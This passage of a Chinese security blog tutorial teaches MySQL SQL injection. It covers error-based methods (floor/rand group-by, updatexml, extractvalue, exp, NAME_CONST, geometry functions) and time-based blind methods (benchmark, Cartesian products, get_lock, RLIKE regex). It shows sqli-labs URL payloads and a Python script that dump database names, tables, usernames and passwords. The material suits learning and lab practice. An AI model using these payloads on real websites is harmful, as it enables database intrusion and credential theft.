alt="1290d0d11e360a9478b2013628c51cbb.png"></p><p>他们的组合就是统计了每个数据库里有多少张表。</p><p>其原理就是：Mysql会建立一张临时表，有group_key和tally两个字段，其中group_key设置了UNIQUE约束，即不能有两行的group_key列的值相同。使用group by语句和count()函数的时候，mysql数据库会先建立一个虚拟表，当查询到新的键不在虚拟表中，数据库就会将其插入表中，如果数据库中已存在该键，则找到该键对应的计数字段并加1。</p><p>③双查询的核心语句(几个函数综合使用)</p><p>先看payload：<strong>select floor(rand(14)*2) c, count(*) from information_schema.columns group by c;</strong></p><p><img src="2cb3904b80a2bf573ed928f48bce400d.png" alt="2cb3904b80a2bf573ed928f48bce400d.png"></p><p>报错了，那为什么会报错？ 分析一下： SQL语句中用列c分组，而列c是floor(rand(14)2)的别名。 floor(rand(14)2)产生的随机数列，前四位是：1，0，1，0。</p><p>我们查询的时候，mysql数据库会先建立一个临时表，设置了UNIQUE约束的group_key和tally两个字段。当查询到新的”group_key键”不在临时表中，数据库就会将其插入临时表中，如果数据库中已存在group_key该键，则找到该键对应的”tally计数”字段并加1。</p><p>创建好临时表后，Mysql开始逐行扫描information_schema.columns表，遇到的第一个分组列是floor(rand(14)2)，计算出其值为1，便去查询临时表中是否有group_key为1的行，发现没有，便在临时表中新增一行，group_key为floor(rand(14)2)，注意此时又计算了一次，结果为0。所以实际插入到临时表的一行group_key为0，tally为1，临时表变成了：</p><p><img src="939d936eb5fd3ce6ec49271d8b0cdad7.png" alt="939d936eb5fd3ce6ec49271d8b0cdad7.png"></p><p>Mysql继续扫描information_schema.columns表，遇到的第二个分组列还是floor(rand(14)2)，计算出其值为1(这个1是随机数列的第三个数)，便去查询临时表中是否有group_key为1的行，发现没有，便在临时表中新增一行，group_key为floor(rand(14)2)，此时又计算了一次，结果为0(这个0是随机数列的第四个数)，所以尝试向临时表插入一行数据，group_key为0，tally为1。但实际上临时表中已经有一行的group_key为0，而group_key又设置了不可重复的约束，所以就会出现报错。</p><p>知道了原理，就实战一下。以sql-lib/Less-5为例：</p><p>判断闭合点：</p><p><img src="59e073bf797be48b5ff6fe69aad8d8ea.png" alt="59e073bf797be48b5ff6fe69aad8d8ea.png"></p><p>然后查询数据库： 构建payload:<strong>?id=-1’ union select 1,count(*),concat( (select database()),floor(rand()*2)) as a from information_schema.tables group by a –+</strong></p><p><img src="4f0d2f67fef730563cc02900143049ff.png" alt="4f0d2f67fef730563cc02900143049ff.png"></p><p>数据库就在报错的信息里显示出来了。</p><p>但是，因为是随机值，所以只会有50%的概率会报错。</p><p><img src="91467023fdd0d5dd6ce63759f8052cfe.png" alt="91467023fdd0d5dd6ce63759f8052cfe.png"></p><p>相同的payload但显示正常。</p><p>有大佬说，可以通过修改rand()使用的种子来使其百分百报错,如下将rand()改为rand(1)，测试百分之百报错，即payload：**?id=-1’ union select 1,count(*),concat( (select database()),floor(rand(1)*2)) as a from information_schema.tables group by a –+**</p><p><img src="4eeaae83bfcaf350da69a24bd8de949c.png" alt="4eeaae83bfcaf350da69a24bd8de949c.png"></p><p>但我发现，rand(1)并不会100%报错，反而我是试了几次都没有报错，只有4，11，14，15这几个数会100%报错，我也不知道什么原因，在这里留个悬念，希望大佬能解释一下。</p><p>我们来爆表,前面我们知道了当前数据库的为security，构造payload：**?id=-1’ union select 1,count(*),concat( (select table_name from information_schema.tables where table_schema=’security’ limit 3,1),floor(rand(4)*2)) as a from information_schema.columns group by a –+**</p><p><img src="d6eeb17c91a9046185ea1281351de813.png" alt="d6eeb17c91a9046185ea1281351de813.png"></p><p>总共四张表，我们在第三张拿到了我们想要的。</p><p>知道了表名，看列值，构造payload：**?id=-1’ union select 1,count(*),concat( (select column_name from information_schema.columns where table_name=’users’ limit 4,1),floor(rand(4)*2)) as a from information_schema.columns group by a –+**</p><p>我通过修改limit X,1里X的值，在3，1的时候看到了password字段</p><p><img src="979e12860cff99de5f356784316ce477.png" alt="979e12860cff99de5f356784316ce477.png"></p><p>在9，1的时候得到了用户名字段</p><p><img src="dbca3f53b9685c2ce7fc108929f9124b.png" alt="dbca3f53b9685c2ce7fc108929f9124b.png"></p><p>开始拿用户名和密码，构造payload：**?id=-1’ union select 1,count(*),concat( (select username from users limit 0,1),floor(rand(4)*2)) as a from information_schema.columns group by a –+**</p><p><img src="6fbb3ca84a8bbb30b0cbbad02afbd2b0.png" alt="6fbb3ca84a8bbb30b0cbbad02afbd2b0.png"></p><p>和**?id=-1’ union select 1,count(*),concat( (select password from users limit 0,1),floor(rand(4)*2)) as a from information_schema.columns group by a –+**</p><p><img src="69a10577a8e04f5df50845982bd82f15.png" alt="69a10577a8e04f5df50845982bd82f15.png"></p><p>这里要注意用户名和密码的列数应改相对。</p><p>是不是jio着麻烦，附上Mochaaz大佬的python代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requestsfrom bs4 <span class="keyword">import</span> BeautifulSoupdb_name = <span class="string">&#x27;&#x27;</span>table_list = []column_list = []url = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;http://192.168.1.158/sqlilabs/Less-5/?id=1&#x27;</span><span class="string">&#x27;&#x27;</span>### 获取当前数据库名 ###<span class="built_in">print</span>(<span class="string">&#x27;当前数据库名:&#x27;</span>)payload = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span> and <span class="number">1</span>=(<span class="keyword">select</span> count(*) from information_schema.columns group by concat(<span class="number">0x3a</span>,(<span class="keyword">select</span> database()),<span class="number">0x3a</span>,floor(rand(<span class="number">0</span>)*<span class="number">2</span>)))--+<span class="string">&#x27;&#x27;</span><span class="string">&#x27;r = requests.get(url+payload)db_name = r.text.split(&#x27;</span>:<span class="string">&#x27;)[-2]print(&#x27;</span>[+]<span class="string">&#x27; + db_name)### 获取表名 ###print(&#x27;</span>数据库%s下的表名:<span class="string">&#x27; % db_name)for i in range(50):payload = &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27; and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select table_name from information_schema.tables where table_schema=&#x27;</span>%s<span class="string">&#x27; limit %d,1),0x3a,floor(rand(0)*2)))--+&#x27;</span><span class="string">&#x27;&#x27;</span> % (db_name,i)r = requests.get(url+payload)<span class="keyword">if</span> <span class="string">&#x27;group_key&#x27;</span> not in r.text:breaktable_name = r.text.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">-2</span>]table_list.<span class="built_in">append</span>(table_name)<span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span> + table_name)### 获取列名 ####### 这里以users表为例 ####<span class="built_in">print</span>(<span class="string">&#x27;%s表下的列名:&#x27;</span> % table_list[<span class="number">-1</span>])<span class="keyword">for</span> i in <span class="keyword">range</span>(<span class="number">50</span>):payload = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#x27;</span> and <span class="number">1</span>=(<span class="keyword">select</span> count(*) from information_schema.columns group by concat(<span class="number">0x3a</span>,(<span class="keyword">select</span> column_name from information_schema.columns where table_name=<span class="string">&#x27;%s&#x27;</span> limit %d,<span class="number">1</span>),<span class="number">0x3a</span>,floor(rand(<span class="number">0</span>)*<span class="number">2</span>)))--+<span class="string">&#x27;&#x27;</span><span class="string">&#x27; % (table_list[-1],i)r = requests.get(url + payload)if &#x27;</span>group_key<span class="string">&#x27; not in r.text:breakcolumn_name = r.text.split(&#x27;</span>:<span class="string">&#x27;)[-2]column_list.append(column_name)print(&#x27;</span>[+]<span class="string">&#x27; + column_name)### 获取字段值 ####### 这里以username列为例 ####print(&#x27;</span>%s列下的字段值:<span class="string">&#x27; % column_list[-2])for i in range(50):payload = &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27; and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+&#x27;</span><span class="string">&#x27;&#x27;</span> % (column_list[<span class="number">-2</span>],db_name,table_list[<span class="number">-1</span>],i)r = requests.get(url + payload)<span class="keyword">if</span> <span class="string">&#x27;group_key&#x27;</span> not in r.text:breakdump = r.text.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">-2</span>]<span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span> + dump)</span><br></pre></td></tr></table></figure><p>花费几小时的注入，代码几秒就出来结果了。</p><p><img src="4175b0d777306d3061a07f5f82455310.png" alt="4175b0d777306d3061a07f5f82455310.png"></p><p>用户名直接出来了，我要好好学python了，啥都不会。我们可以开始注入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; union select 1,count(*),concat((select database()),floor(rand()*2))a from information_schema.columns group by a -- -</span></span><br><span class="line"><span class="string">1</span></span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center.png" alt="在这里插入图片描述"><br>可以知道数据库名是security。<br>然后获取表名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; union select 1,count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),floor(rand()*2))a from information_schema.columns group by a -- -</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center-164143712726634.png" alt="在这里插入图片描述"><br>然后就是字段和查询列：<br><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center-164143712726735.png" alt="在这里插入图片描述"><br>就可以了。</p><p>Xpath报错注入</p><p>xpath报错注入可以使用的函数我知道的有两个，分别是：updatexml(),extractvalue()。<br>updatexml报错注入的用法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>extractvalue的用法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select database()),0x7e))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center-164143712726736.png" alt="在这里插入图片描述"></p><p>之后extractvalue的注入方式就和平常的注入一样了。<br>同理updatexml也是这样注入。</p><p>利用double 数值类型超出范围进行报错注入</p><p>具体可以参考：<br><a href="https://www.cnblogs.com/lcamry/articles/5509124.html">使用exp进行SQL报错注入</a></p><p>注入方式如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; union select (exp(~(select * FROM(SELECT USER())a))),2,3--+</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>只不过在这题，它并不会回显真正的user()，但是上面的文章里面有回显，可能是因为一些玄学原因吧，作为一个知识点了解了解。</p><p>利用bigint 溢出进行报错注入</p><p>可以参考：<br><a href="https://blog.csdn.net/weixin_43902454/article/details/96495984">基于BIGINT溢出错误的SQL注入</a><br>不过这里有个坑，就是这里<br><img src="20200918235003162.png#pic_center" alt="在这里插入图片描述"><br>如果去查，会发现网上都是说查询成功返回值是0。这是不对的，其实真正的返回值就是你的查询结果。但是进行!操作的时候，实际上存在了类型转换。<br><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center-164143712726737.jpeg" alt="在这里插入图片描述"><br><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center-164143712726738.jpeg" alt="在这里插入图片描述"></p><p>因此并不是像网上所说的那样。</p><p>同样的，这题使用bigint报错也不会有那种我们预期的结果，可能也是版本或者玄学的问题。</p><p>NAME_CONST</p><p>利用数据的重复性。<br>使用的姿势：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;</span><br><span class="line">1</span><br><span class="line">?id=1<span class="string">&#x27;union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+</span></span><br><span class="line"><span class="string">1</span></span><br></pre></td></tr></table></figure><p>不过这种方式过于鸡肋，因为如果传入NAME_CONST的参数不是常量，就会报错（不是报错注入的那种报错），似乎只有version()可以用</p><p>总结</p><p>报错注入的姿势实在是太多太多，这是一个大的总结：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> floor <span class="operator">+</span> rand <span class="operator">+</span> <span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span> <span class="keyword">union</span> <span class="keyword">select</span>  <span class="operator">!</span><span class="number">1</span>)x <span class="keyword">group</span> <span class="keyword">by</span> concat((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables  limit <span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)));</span><br><span class="line"><span class="number">2.</span> ExtractValue</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>, (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables limit <span class="number">1</span>)));</span><br><span class="line"><span class="number">3.</span> UpdateXml</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">1</span>));</span><br><span class="line"><span class="number">4.</span> Name_Const(<span class="operator">&gt;</span><span class="number">5.0</span><span class="number">.12</span>)</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> NAME_CONST(version(),<span class="number">0</span>),NAME_CONST(version(),<span class="number">0</span>))x;</span><br><span class="line"><span class="number">5.</span> <span class="keyword">Join</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b)c;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b <span class="keyword">using</span>(Host))c;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b <span class="keyword">using</span>(Host,<span class="keyword">User</span>))c;</span><br><span class="line"><span class="number">6.</span> <span class="built_in">exp</span>()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">Exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> version())a));</span><br><span class="line"><span class="number">7.</span> geometrycollection()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"><span class="number">8.</span> multipoint()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"><span class="number">9.</span> polygon()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"><span class="number">10.</span> multipolygon()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"><span class="number">11.</span> linestring()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"><span class="number">12.</span> multilinestring()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"><span class="number">123456789101112131415161718192021222324252627</span></span><br></pre></td></tr></table></figure><p>还有很多方式没有提到</p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><ul><li><strong>sleep()函数</strong></li><li><strong>benchmark函数</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(count,expr)</span><br></pre></td></tr></table></figure><p><code>benchmark</code>函数会重复计算expr表达式count次，所以我们可以尽可能多的增加计算的次数来增加时间延迟，如下：<br><a href=""><img src="ZZi7GR.md.png" alt="img"></a></p><p>可以看到通过重复计算延时了<code>1.90s</code></p><ul><li><strong>笛卡尔积盲注</strong></li></ul><p>注入姿势</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+-----------+</span><br><span class="line">| count(*)  |</span><br><span class="line">+-----------+</span><br><span class="line">| 113101560 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (2.07 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and 1=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">+------+-----+</span><br><span class="line">| user | pwd |</span><br><span class="line">+------+-----+</span><br><span class="line">| 1    | 0   |</span><br><span class="line">+------+-----+</span><br><span class="line">1 row in set (2.08 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and 1=0 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">Empty set (0.01 sec)</span><br></pre></td></tr></table></figure><p>利用<code>and短路运算规则</code>进行时间盲注。</p><ul><li><strong>GET_LOCK盲注</strong></li></ul><p><code>get_lock</code>函数官方文档中的介绍</p><p><a href="https://s2.ax1x.com/2019/06/25/ZZAQbT.md.png"><img src="ZZAQbT.md.png" alt="img"></a></p><p>可以看出文档中写的是我们如果已经开了一个session，对关键字进行了get_lock,那么再开另一个session再次对关键进行get_lock，就会延时我们指定的时间。</p><p>此盲注手法有一些限制，就是必须要同时开两个<code>SESSION</code>进行注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">SESSION A</span><br><span class="line">mysql&gt; select get_lock(&#x27;lihuaiqiu&#x27;,1);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(&#x27;lihuaiqiu&#x27;,1) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       1 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">SESSION B</span><br><span class="line">mysql&gt; select get_lock(&#x27;lihuaiqiu&#x27;,5);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(&#x27;lihuaiqiu&#x27;,5) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       0 |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (5.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;0&#x27; and 1=1 and  get_lock(&#x27;lihuaiqiu&#x27;,2);</span><br><span class="line">Empty set (2.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;0&#x27; and 1=0 and  get_lock(&#x27;lihuaiqiu&#x27;,2);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure><p>同样的盲注利用手法。</p><ul><li><strong>正则<code>DOS</code> RLIKE注入</strong></li></ul><p>延时原理，利用SQL多次计算正则消耗计算资源产生延时效果，其实原理是和我们的<code>benchmark</code>注入差不多的。</p><p>利用手法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag where flag=&#x27;1&#x27; and if(mid(user(),1,1)=&#x27;s&#x27;,concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;,1);</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">| 1    |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag where flag=&#x27;1&#x27; and if(mid(user(),1,1)=&#x27;r&#x27;,concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+cd&#x27;,1);</span><br><span class="line">Empty set (3.83 sec)</span><br></pre></td></tr></table></figure><p>报错注入</p><p>正常的报错注入网上一搜是一大把的，所以下面讲的是几个比较的姿势。</p><ul><li><strong>mysql列名重复报错</strong></li></ul><p>在mysql中，mysql列名重复会导致报错，而我们可以通过<code>name_const</code>制造一个列.</p><p>Name_const函数用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select name_const(version(),1);</span><br><span class="line">+--------+</span><br><span class="line">| 5.5.47 |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>报错用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 